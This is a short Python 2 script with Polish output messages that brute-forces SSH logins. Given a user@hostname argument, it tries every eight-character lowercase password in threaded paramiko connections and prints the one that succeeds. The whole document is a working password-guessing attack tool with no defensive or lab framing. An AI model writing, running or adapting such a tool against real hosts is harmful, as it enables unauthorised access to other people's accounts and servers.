#!/usr/bin/env python
import threading
import paramiko
import sys
import time
import itertools
import string

quit=False
password=""
class CheckPasswd(threading.Thread):
	def __init__(self,hostname,user,passwd):
		self.passwd=passwd
		self.hostname=hostname
		self.user=user
		threading.Thread.__init__(self)
	def run(self):
		global quit
		global password
		ssh=paramiko.SSHClient()
		ssh.load_system_host_keys()
		ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
		try:
			ssh.connect(self.hostname,port=22,username=self.user,password=self.passwd)
#			print "Haslo dla ",self.user,"to ",self.passwd
			password=self.passwd
			quit=True
		except paramiko.AuthenticationException, error:
			pass
#			print error
			print "Haslo ",self.passwd," jest zle"
		except paramiko.SSHException, error:
			pass
#			print error
#			print "Zly hostname"
		except Exception:
			pass

if len(sys.argv) < 2:
	print "Username and hostname missing"
	print "Usage: ",sys.argv[0]," <user@hostname>"
	exit(1)
param=sys.argv[1].split("@")
if len(param) < 2:
	print "Username missing"
	print "Usage: ",sys.argv[0]," <user@hostname>"
	exit(2)
if len(param) >2:
	print "incompatible username and hostname format"
	print "Usage: ",sys.argv[0]," <user@hostname>"
	exit(2)
user=param[0]
hostname=param[1]
#passwords=['a','b','c','d','oldman','e','f']
#password=[]
for i in range(8,9):
	passwords=itertools.product(string.ascii_lowercase,repeat=i)
	for i in passwords:
		password=''.join(i)
		if quit:
			break
		t=CheckPasswd(hostname,user,password)
		t.start()

		time.sleep(0.1)
	t.join()
	if quit:
		break
print "Znalezione haslo to",password
